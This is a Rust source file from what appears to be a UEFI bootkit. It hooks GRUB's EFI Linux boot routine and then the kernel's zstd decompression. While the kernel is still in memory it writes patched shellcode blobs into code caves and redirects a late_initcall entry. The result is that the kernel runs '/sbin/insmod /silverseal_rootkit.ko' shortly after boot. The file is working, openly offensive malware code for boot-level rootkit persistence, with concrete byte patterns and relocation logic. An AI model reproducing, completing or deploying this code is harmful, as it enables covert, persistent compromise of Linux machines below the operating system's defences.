use log::{debug, error, info};

use crate::helpers::{
    file_helper::{cave_finder_by_section_name, get_section_address_by_name, cave_finder_by_section_name_after},
    memory_helper::{
        INLINE_HOOK_SIZE, InitcallPhase, InlineHook, ZSTD_DECOMPRESS_FUNC_SIGNATURE, binary_search,
        get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
        translate_physical_to_virtual,
    },
};

pub static mut GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE: InlineHook = InlineHook {
    target: 0,
    hook: 0,
    original_bytes: [0; INLINE_HOOK_SIZE],
};

pub static mut ZSTD_DECOMPRESS_DCTX_HOOK_INLINE: InlineHook = InlineHook {
    target: 0,
    hook: 0,
    original_bytes: [0; INLINE_HOOK_SIZE],
};

// ── Kernel function patterns (fill with target-kernel byte sequences) ─────────
// Each PATTERN identifies a unique byte sequence within the function body;
// DISTANCE is the byte count to subtract from the match address to reach the
// function entry point.  Values are left empty until extracted from a target
// kernel binary.
const QUEUE_DELAYED_WORK_PATTERN: &[u8] = &[0x41, 0x54, 0x4C, 0x8D, 0x62, 0x20];
const QUEUE_DELAYED_WORK_DISTANCE: u8 = 9;
const CALL_USERMODEHELPER_PATTERN: &[u8] = &[0x81, 0xC6, 0xC0, 0x0D, 0x00, 0x00, 0x48, 0xC1, 0xE8, 0x3C];
const CALL_USERMODEHELPER_DISTANCE: u8 = 0x40;
// system_wq is a kernel global (struct workqueue_struct *).  PATTERN matches
// unique bytes near the MOV instruction that loads it in a known caller;
// DISTANCE backs up to the start of that instruction
// (opcode sequence: 48 8B 3D xx xx xx xx — MOV RDI, [RIP+disp32]).
// Rust reads the embedded disp32 to derive system_wq's virtual address.
const SYSTEM_WQ_OFFSET: u32 = 0x83a9b0;
// const SYSTEM_WQ_PATTERN: &[u8] = &[];             // TODO: extract from target kernel
// const SYSTEM_WQ_DISTANCE: u8 = 0;                 // TODO: offset back to MOV start
const DELAYED_WORK_TIMER_FN_PATTERN: &[u8] = &[0x55, 0x48, 0x8D, 0x57, 0xE0];
const DELAYED_WORK_TIMER_FN_DISTANCE: u8 = 5;

// ── Stager sentinels (unchanged) ─────────────────────────────────────────────
const SET_MEMORY_X_PATTERN: &[u8] = &[0x31, 0xC0, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x08];
const SET_MEMORY_X_DISTANCE: u8 = 6;
const CAVE_PAGE_DISP_SENTINEL: u32 = 0x11223344;
const SET_MEMORY_X_REL_SENTINEL: u32 = 0x55667788;
const LOADER_JMP_REL_SENTINEL: u32 = 0x99AABBCC;

// ── Loader sentinels ──────────────────────────────────────────────────────────
const ORIGINAL_FN_REL_SENTINEL: u32 = 0x12345678;
const LKM_WORKER_CAVE_SENTINEL: u32 = 0x11EEDDFF;
const TIMER_FN_DISP_SENTINEL: u32 = 0xBBCCDDEE;
const SYSTEM_WQ_DISP_SENTINEL: u32 = 0xCCDDEEFF;
const QUEUE_DELAYED_WORK_REL_SENTINEL: u32 = 0x33445566;

// ── lkm_worker sentinels ──────────────────────────────────────────────────────
const INSMOD_PATH_DISP_SENTINEL: u32 = 0xFEDCBA98;
const ARGV_DATA_DISP_SENTINEL: u32 = 0x98BADCFE;
const CALL_USERMODEHELPER_REL_SENTINEL: u32 = 0x77889900;

/// grub_arch_efi_linux_boot_image_hook is an inline hook for the GRUB function responsible for loading Linux boot images on EFI systems.
/// It restores the original function before executing it to ensure stability, and hooking the Linux kernel.
///
/// # Arguments
/// - `kernel_entry`: The entry point of the Linux kernel.
/// - `kernel_size`: The size of the Linux kernel.
/// - `args`: Additional arguments passed to the original function.
///
/// # Returns
/// - `i32`: The return value from the original function, or -1 if an error occurs.
pub extern "C" fn grub_arch_efi_linux_boot_image_hook(
    kernel_entry: usize,
    kernel_size: usize,
    args: *const u8,
) -> i32 {
    let original_fn_addr: usize;
    let real_kernel_entry: usize;
    unsafe {
        core::arch::asm!(
            "mov {}, rax",
            out(reg) original_fn_addr,
            options(nomem, nostack, preserves_flags)
        );
        core::arch::asm!(
            "mov {}, r12",
            out(reg) real_kernel_entry,
            options(nomem, nostack, preserves_flags)
        );
    }

    debug!(
        "grub_arch_efi_linux_boot_image_hook called with kernel_entry: {:#x}, kernel_size: {:#x}, args: {:#x}",
        real_kernel_entry, kernel_size, args as usize
    );

    // Snapshot hook state once so restore/jump use the same values.
    let mut target = unsafe {
        core::ptr::addr_of!(GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE.target).read_volatile()
    };
    let original_bytes = unsafe {
        core::ptr::addr_of!(GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE.original_bytes)
            .read_volatile()
    };

    if target == 0 {
        error!("Hook target was not initialized");
        return -1;
    }

    if original_fn_addr == 0 {
        error!("Original function address was not preserved");
        return -1;
    }

    if let Err(e) = restore_inline_hook(target, &original_bytes) {
        error!("Failed to restore original function: {:?}", e);
        return -1;
    }

    let original_fn: extern "C" fn(usize, usize, *const u8) -> i32 =
        unsafe { core::mem::transmute(original_fn_addr) };

    // Finding zstd_decompress_dctx in vmlinuz.
    target = match binary_search(
        real_kernel_entry as usize,
        kernel_size as usize,
        ZSTD_DECOMPRESS_FUNC_SIGNATURE,
    ) {
        Some(addr) => addr,
        None => {
            error!("Failed to find target function in original GRUB");

            return original_fn(kernel_entry, kernel_size, args);
        }
    };

    if target == 0 {
        error!("Failed to find target function in original GRUB");

        return original_fn(kernel_entry, kernel_size, args);
    }
    debug!("Found target function at address: {:#x}", target);

    // Hooking vmlinuz's decompression functions.
    let vmlinuz_hook = zstd_decompress_dctx_hook as *const () as usize;
    let hook_info = match inline_jump_hook(target, vmlinuz_hook) {
        Ok(info) => info,
        Err(e) => {
            error!("Failed to install inline hook, reason {:?}", e);

            return original_fn(kernel_entry, kernel_size, args);
        }
    };
    unsafe {
        ZSTD_DECOMPRESS_DCTX_HOOK_INLINE = hook_info;
    }
    debug!(
        "Installed zstd_decompress_dctx_hook at address: {:#x}",
        vmlinuz_hook
    );

    // Call the original callee that was held in rax at the patched call site.
    original_fn(kernel_entry, kernel_size, args)
}

/// zstd_decompress_dctx_hook is an inline hook for the zstd_decompress_dctx function in the Linux kernel.
///
/// # Arguments:
/// - `dctx`: The decompression context.
/// - `dst`: The destination buffer for the decompressed data.
/// - `dst_capacity`: The capacity of the destination buffer.
/// - `src`: The source buffer containing the compressed data.
/// - `src_size`: The size of the source buffer.
///
/// # Returns:
/// - `isize`: The return value from the original function, or -1 if an error occurs.
pub extern "sysv64" fn zstd_decompress_dctx_hook(
    dctx: usize,
    dst: usize,
    dst_capacity: usize,
    src: usize,
    src_size: usize,
) -> isize {
    debug!(
        "zstd_decompress_dctx_hook called with dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
        dctx, dst, dst_capacity, src, src_size
    );

    let target =
        unsafe { core::ptr::addr_of!(ZSTD_DECOMPRESS_DCTX_HOOK_INLINE.target).read_volatile() };
    let original_bytes = unsafe {
        core::ptr::addr_of!(ZSTD_DECOMPRESS_DCTX_HOOK_INLINE.original_bytes).read_volatile()
    };
    if target == 0 {
        error!("Hook target was not initialized");

        return -1;
    }
    if let Err(e) = restore_inline_hook(target, &original_bytes) {
        error!("Failed to restore original function: {:?}", e);
        return -1;
    }
    let original_fn: extern "sysv64" fn(usize, usize, usize, usize, usize) -> isize =
        unsafe { core::mem::transmute(target) };
    let ret_val = original_fn(dctx, dst, dst_capacity, src, src_size);

    debug!(
        "zstd_decompress_dctx state is now: dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
        dctx, dst, dst_capacity, src, src_size
    );
    info!(
        "Decompressed linux kernel is at address: {:#x}, size: {:#x}",
        dst, dst_capacity
    );

    // Deploy the kernel hook: overwrite the late_initcall slot to point at our
    // shellcode in the code cave, which calls queue_delayed_work to schedule
    // the rootkit load, then tail-calls the original initcall target.
    let initcall_info =
        match get_initcall_phase_address(dst, dst_capacity, InitcallPhase::LateInitcall) {
            Some(info) => info,
            None => {
                error!("Failed to find late_initcall address in kernel");
                return ret_val;
            }
        };
    debug!(
        "Found late_initcall entry: entry_phys={:#x}, entry_virt={:#x}, original_target_virt={:#x}",
        initcall_info.entry_physical_address,
        initcall_info.entry_virtual_address,
        initcall_info.original_target_virtual_address
    );

    // Stage 1 — stager lives in .text (always RX): makes .data cave executable,
    //           jumps to loader.
    // Stage 2 — loader lives in .data: initialises delayed_work with
    //           work.func = &lkm_worker (.text), calls queue_delayed_work,
    //           tail-calls original initcall.
    // Stage 3 — lkm_worker lives in .text (always RX): fires ~10 s after boot,
    //           calls call_usermodehelper to load the rootkit via insmod.
    const STAGER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_STAGER_BIN"));
    const STAGER_LEN: usize = STAGER_TEMPLATE.len();
    const LOADER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_LOADER_BIN"));
    const LOADER_LEN: usize = LOADER_TEMPLATE.len();
    const LKM_WORKER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_WORKER_BIN"));
    const LKM_WORKER_LEN: usize = LKM_WORKER_TEMPLATE.len();

    // Find stager cave in .text.
    let stager_cave = match cave_finder_by_section_name(dst, dst_capacity, STAGER_LEN, ".text") {
        Some(addr) => addr,
        None => {
            error!("Failed to find stager cave in .text");
            return ret_val;
        }
    };
    debug!("Stager cave: phys={:#x}", stager_cave);

    // Find lkm_worker cave in .text — must be after the stager cave.
    let lkm_worker_cave = match cave_finder_by_section_name_after(
        dst,
        dst_capacity,
        LKM_WORKER_LEN,
        ".text",
        stager_cave + STAGER_LEN,
    ) {
        Some(addr) => addr,
        None => {
            error!("Failed to find lkm_worker cave in .text");
            return ret_val;
        }
    };
    debug!("lkm_worker cave: phys={:#x}", lkm_worker_cave);

    // Find loader cave in .data.
    let loader_cave = match cave_finder_by_section_name(dst, dst_capacity, LOADER_LEN, ".data") {
        Some(addr) => addr,
        None => {
            error!("Failed to find loader cave in .data");
            return ret_val;
        }
    };
    debug!("Loader cave: phys={:#x}", loader_cave);

    // Find set_memory_x via byte pattern.
    let mut set_memory_x_phys = match binary_search(dst, dst_capacity, SET_MEMORY_X_PATTERN) {
        Some(addr) => addr,
        None => {
            error!("Failed to find set_memory_x");
            return ret_val;
        }
    };
    set_memory_x_phys -= SET_MEMORY_X_DISTANCE as usize;
    let set_memory_x_virt = match translate_physical_to_virtual(dst, dst_capacity, set_memory_x_phys) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate set_memory_x to virtual address");
            return ret_val;
        }
    };
    debug!(
        "set_memory_x: phys={:#x}, virt={:#x}",
        set_memory_x_phys, set_memory_x_virt
    );

    // Find queue_delayed_work via byte pattern.
    let mut queue_delayed_work_phys =
        match binary_search(dst, dst_capacity, QUEUE_DELAYED_WORK_PATTERN) {
            Some(addr) => addr,
            None => {
                error!("Failed to find queue_delayed_work in kernel");
                return ret_val;
            }
        };
    queue_delayed_work_phys -= QUEUE_DELAYED_WORK_DISTANCE as usize;
    let queue_delayed_work_virt =
        match translate_physical_to_virtual(dst, dst_capacity, queue_delayed_work_phys) {
            Some(addr) => addr,
            None => {
                error!("Failed to translate queue_delayed_work to virtual address");
                return ret_val;
            }
        };
    debug!(
        "queue_delayed_work: phys={:#x}, virt={:#x}",
        queue_delayed_work_phys, queue_delayed_work_virt
    );

    // Find call_usermodehelper via byte pattern.
    let mut call_usermodehelper_phys =
        match binary_search(dst, dst_capacity, CALL_USERMODEHELPER_PATTERN) {
            Some(addr) => addr,
            None => {
                error!("Failed to find call_usermodehelper in kernel");
                return ret_val;
            }
        };
    call_usermodehelper_phys -= CALL_USERMODEHELPER_DISTANCE as usize;
    let call_usermodehelper_virt =
        match translate_physical_to_virtual(dst, dst_capacity, call_usermodehelper_phys) {
            Some(addr) => addr,
            None => {
                error!("Failed to translate call_usermodehelper to virtual address");
                return ret_val;
            }
        };
    debug!(
        "call_usermodehelper: phys={:#x}, virt={:#x}",
        call_usermodehelper_phys, call_usermodehelper_virt
    );

    let rodata_virt = match get_section_address_by_name(dst, dst_capacity, ".rodata") {
        Some(sec) => sec,
        None => {
            error!("Failed to find .rodata section in kernel");
            return ret_val;
        }
    };
    let system_wq_virt = rodata_virt + SYSTEM_WQ_OFFSET as usize;
    debug!(".rodata section: virt={:#x}, system_wq: virt={:#x}", rodata_virt, system_wq_virt);

    // Find delayed_work_timer_fn via byte pattern.
    let mut dtimerfn_phys =
        match binary_search(dst, dst_capacity, DELAYED_WORK_TIMER_FN_PATTERN) {
            Some(addr) => addr,
            None => {
                error!("Failed to find delayed_work_timer_fn in kernel");
                return ret_val;
            }
        };
    dtimerfn_phys -= DELAYED_WORK_TIMER_FN_DISTANCE as usize;
    let dtimerfn_virt = match translate_physical_to_virtual(dst, dst_capacity, dtimerfn_phys) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate delayed_work_timer_fn to virtual address");
            return ret_val;
        }
    };
    debug!(
        "delayed_work_timer_fn: phys={:#x}, virt={:#x}",
        dtimerfn_phys, dtimerfn_virt
    );

    let stager_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, stager_cave) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate stager cave to virtual address");
            return ret_val;
        }
    };
    debug!(
        "Stager cave: phys={:#x}, virt={:#x}",
        stager_cave, stager_cave_virt
    );

    let lkm_worker_cave_virt =
        match translate_physical_to_virtual(dst, dst_capacity, lkm_worker_cave) {
            Some(addr) => addr,
            None => {
                error!("Failed to translate lkm_worker cave to virtual address");
                return ret_val;
            }
        };
    debug!(
        "lkm_worker cave: phys={:#x}, virt={:#x}",
        lkm_worker_cave, lkm_worker_cave_virt
    );

    let loader_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, loader_cave) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate loader cave to virtual address");
            return ret_val;
        }
    };
    debug!(
        "Loader cave: phys={:#x}, virt={:#x}",
        loader_cave, loader_cave_virt
    );

    // ── Patch stager blob ──────────────────────────────────────────────────────
    let mut stager = [0u8; STAGER_LEN];
    stager.copy_from_slice(STAGER_TEMPLATE);

    // disp32 in `lea rdi, [rip + disp32]`: rip-after = stager_cave_virt + off + 4
    let sentinel = CAVE_PAGE_DISP_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
        let disp32 = (loader_cave_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!("Loader cave too far from stager for disp32: delta={:#x}", disp32);
            return ret_val;
        }
        stager[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find CAVE_PAGE_DISP_SENTINEL in stager");
        return ret_val;
    }

    let sentinel = SET_MEMORY_X_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
        let rel32 = (set_memory_x_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!("set_memory_x too far from stager for rel32: delta={:#x}", rel32);
            return ret_val;
        }
        stager[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find SET_MEMORY_X_REL_SENTINEL in stager");
        return ret_val;
    }

    let sentinel = LOADER_JMP_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
        let rel32 = (loader_cave_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!("Loader cave too far from stager for rel32: delta={:#x}", rel32);
            return ret_val;
        }
        stager[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find LOADER_JMP_REL_SENTINEL in stager");
        return ret_val;
    }

    // ── Patch loader blob ──────────────────────────────────────────────────────
    let mut loader = [0u8; LOADER_LEN];
    loader.copy_from_slice(LOADER_TEMPLATE);

    // Pre-build argv_data in the loader blob.
    // Scan the blob for the known path strings to compute their virtual addresses,
    // then write the pointer values so lkm_worker can read them at call time.
    let insmod_path_offset =
        match loader.windows(13).position(|w| w == b"/sbin/insmod\0") {
            Some(off) => off,
            None => {
                error!("Failed to find insmod_path in loader blob");
                return ret_val;
            }
        };
    let path_buffer_offset =
        match loader.windows(23).position(|w| w == b"/silverseal_rootkit.ko\0") {
            Some(off) => off,
            None => {
                error!("Failed to find path_buffer in loader blob");
                return ret_val;
            }
        };
    // argv_data immediately follows insmod_path (13 bytes: "/sbin/insmod\0")
    let argv_data_offset = insmod_path_offset + 13;
    let insmod_path_virt = loader_cave_virt + insmod_path_offset;
    let path_buffer_virt = loader_cave_virt + path_buffer_offset;
    let argv_data_virt = loader_cave_virt + argv_data_offset;
    loader[argv_data_offset..argv_data_offset + 8]
        .copy_from_slice(&(insmod_path_virt as u64).to_le_bytes());
    loader[argv_data_offset + 8..argv_data_offset + 16]
        .copy_from_slice(&(path_buffer_virt as u64).to_le_bytes());
    // argv_data[16] stays zero (NULL terminator, already zeroed in blob template)
    debug!(
        "argv pre-built: argv[0]={:#x} argv[1]={:#x}",
        insmod_path_virt, path_buffer_virt
    );

    // LKM_WORKER_CAVE_SENTINEL: disp32 in `lea rax, [rip+d]` → lkm_worker_cave_virt
    let sentinel = LKM_WORKER_CAVE_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
        let disp32 =
            (lkm_worker_cave_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!(
                "lkm_worker cave too far from loader for disp32: delta={:#x}",
                disp32
            );
            return ret_val;
        }
        loader[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find LKM_WORKER_CAVE_SENTINEL in loader");
        return ret_val;
    }

    // TIMER_FN_DISP_SENTINEL: disp32 in `lea rax, [rip+d]` → delayed_work_timer_fn
    let sentinel = TIMER_FN_DISP_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
        let disp32 = (dtimerfn_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!(
                "delayed_work_timer_fn too far from loader cave for disp32: delta={:#x}",
                disp32
            );
            return ret_val;
        }
        loader[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find TIMER_FN_DISP_SENTINEL in loader");
        return ret_val;
    }

    // SYSTEM_WQ_DISP_SENTINEL: disp32 in `mov rdi, [rip+d]` → system_wq global
    let sentinel = SYSTEM_WQ_DISP_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
        let disp32 = (system_wq_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!(
                "system_wq too far from loader cave for disp32: delta={:#x}",
                disp32
            );
            return ret_val;
        }
        loader[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find SYSTEM_WQ_DISP_SENTINEL in loader");
        return ret_val;
    }

    // QUEUE_DELAYED_WORK_REL_SENTINEL: rel32 for call queue_delayed_work
    let sentinel = QUEUE_DELAYED_WORK_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
        let rel32 =
            (queue_delayed_work_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!(
                "queue_delayed_work too far from loader cave for rel32: delta={:#x}",
                rel32
            );
            return ret_val;
        }
        loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find QUEUE_DELAYED_WORK_REL_SENTINEL in loader");
        return ret_val;
    }

    let sentinel = ORIGINAL_FN_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
        let rel32 = (initcall_info.original_target_virtual_address as i64)
            - (loader_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!("Original initcall too far from loader cave for rel32: delta={:#x}", rel32);
            return ret_val;
        }
        loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find ORIGINAL_FN_REL_SENTINEL in loader");
        return ret_val;
    }

    // ── Patch lkm_worker blob ──────────────────────────────────────────────────
    let mut lkm_worker = [0u8; LKM_WORKER_LEN];
    lkm_worker.copy_from_slice(LKM_WORKER_TEMPLATE);

    // INSMOD_PATH_DISP_SENTINEL: disp32 in `lea rdi,[rip+d]` → insmod_path
    let sentinel = INSMOD_PATH_DISP_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&lkm_worker, &sentinel) {
        let disp32 =
            (insmod_path_virt as i64) - (lkm_worker_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!(
                "insmod_path too far from lkm_worker cave for disp32: delta={:#x}",
                disp32
            );
            return ret_val;
        }
        lkm_worker[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find INSMOD_PATH_DISP_SENTINEL in lkm_worker");
        return ret_val;
    }

    // ARGV_DATA_DISP_SENTINEL: disp32 in `lea rsi,[rip+d]` → argv_data
    let sentinel = ARGV_DATA_DISP_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&lkm_worker, &sentinel) {
        let disp32 = (argv_data_virt as i64) - (lkm_worker_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!(
                "argv_data too far from lkm_worker cave for disp32: delta={:#x}",
                disp32
            );
            return ret_val;
        }
        lkm_worker[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find ARGV_DATA_DISP_SENTINEL in lkm_worker");
        return ret_val;
    }

    // CALL_USERMODEHELPER_REL_SENTINEL: rel32 for call call_usermodehelper
    let sentinel = CALL_USERMODEHELPER_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&lkm_worker, &sentinel) {
        let rel32 =
            (call_usermodehelper_virt as i64) - (lkm_worker_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!(
                "call_usermodehelper too far from lkm_worker cave for rel32: delta={:#x}",
                rel32
            );
            return ret_val;
        }
        lkm_worker[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find CALL_USERMODEHELPER_REL_SENTINEL in lkm_worker");
        return ret_val;
    }

    // ── Write all three blobs ──────────────────────────────────────────────────
    unsafe {
        core::ptr::copy_nonoverlapping(stager.as_ptr(), stager_cave as *mut u8, STAGER_LEN);
        core::ptr::copy_nonoverlapping(loader.as_ptr(), loader_cave as *mut u8, LOADER_LEN);
        core::ptr::copy_nonoverlapping(
            lkm_worker.as_ptr(),
            lkm_worker_cave as *mut u8,
            LKM_WORKER_LEN,
        );
    }
    debug!(
        "Wrote {} bytes of stager to {:#x}, {} bytes of loader to {:#x}, {} bytes of lkm_worker to {:#x}",
        STAGER_LEN, stager_cave, LOADER_LEN, loader_cave, LKM_WORKER_LEN, lkm_worker_cave
    );

    // ── Patch initcall slot (prel32) to point at the stager ────────────────────
    let relative_offset = (stager_cave_virt as i64) - (initcall_info.entry_virtual_address as i64);
    if relative_offset < i32::MIN as i64 || relative_offset > i32::MAX as i64 {
        error!(
            "Stager cave too far from initcall entry for prel32: delta={:#x}",
            relative_offset
        );
        return ret_val;
    }
    unsafe {
        core::ptr::write(
            initcall_info.entry_physical_address as *mut i32,
            relative_offset as i32,
        );
    }
    info!(
        "Patched late_initcall entry at virt={:#x} (phys={:#x}) prel32={} -> stager at virt={:#x}",
        initcall_info.entry_virtual_address,
        initcall_info.entry_physical_address,
        relative_offset as i32,
        stager_cave_virt
    );

    ret_val
}

/// Finds the byte offset of a 4-byte sentinel value within a buffer.
fn find_sentinel_4(buf: &[u8], sentinel: &[u8; 4]) -> Option<usize> {
    buf.windows(4).position(|w| w == sentinel)
}
